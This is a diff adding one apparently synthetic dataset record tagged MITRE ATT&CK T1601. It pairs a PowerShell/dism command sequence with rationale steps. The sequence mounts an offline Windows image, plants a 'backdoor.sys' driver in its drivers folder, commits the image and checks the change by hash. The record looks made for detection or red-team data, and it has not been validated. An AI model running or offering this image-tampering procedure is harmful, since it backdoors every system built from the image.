@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "dism /Mount-Wim /WimFile:C:\\Images\\install.wim /Index:1 /MountDir:C:\\Mount\\Install; Copy-Item C:\\Payloads\\backdoor.sys C:\\Mount\\Install\\Windows\\System32\\drivers\\backdoor.sys -Force; fc /b C:\\Payloads\\backdoor.sys C:\\Mount\\Install\\Windows\\System32\\drivers\\backdoor.sys; dism /Unmount-Wim /MountDir:C:\\Mount\\Install /Commit; Get-FileHash C:\\Images\\install.wim -Algorithm SHA256; fc /b C:\\Images\\install_clean.wim C:\\Images\\install.wim",
+  "explanation": "Injects a kernel driver into an offline Windows image, confirms the implant by binary comparison within the mount, and validates the WIM\u2019s post-modification integrity.",
+  "rationale_steps": [
+    "Mount the target offline image for servicing.",
+    "Plant a malicious driver into the drivers directory of the image.",
+    "Use fc to confirm the injected file matches the attacker\u2019s payload.",
+    "Commit the image and verify modification via hash and fc vs baseline."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-7053c5d6-eb719488",
+  "source_prompt_hash": "7053c5d6",
+  "timestamp_utc": "2025-09-30T04:53:44.701470Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
